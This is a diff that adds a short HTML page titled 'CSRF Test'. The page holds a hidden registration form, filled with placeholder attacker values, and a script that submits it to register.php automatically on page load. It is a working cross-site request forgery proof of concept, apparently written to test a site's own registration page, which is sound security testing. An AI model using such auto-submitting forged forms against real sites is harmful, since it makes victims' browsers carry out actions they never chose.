@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>CSRF Test</h2>
+
+<!-- Form points to register.php in the same folder -->
+<form action="register.php" method="POST">
+    <input type="hidden" name="idno" value="0000-9999">
+    <input type="hidden" name="firstname" value="Hacker">
+    <input type="hidden" name="middlename" value="CSRF">
+    <input type="hidden" name="lastname" value="Injected">
+    <input type="hidden" name="suffix" value="">
+    <input type="hidden" name="sex" value="Male">
+    <input type="hidden" name="email" value="csrf@attack.com">
+    <input type="hidden" name="username" value="csrf_test">
+    <input type="hidden" name="password" value="Password123">
+    <input type="hidden" name="repassword" value="Password123">
+    <input type="hidden" name="birthdate" value="2005-01-01">
+    <input type="hidden" name="purok" value="Purok1">
+    <input type="hidden" name="barangay" value="Barangay1">
+    <input type="hidden" name="municipality" value="Municipality1">
+    <input type="hidden" name="province" value="Province1">
+    <input type="hidden" name="country" value="Philippines">
+    <input type="hidden" name="zipcode" value="1234">
+</form>
+
+<script>
+    document.forms[0].submit(); // Auto-submit on page load
+</script>
+
+</body>
+</html>
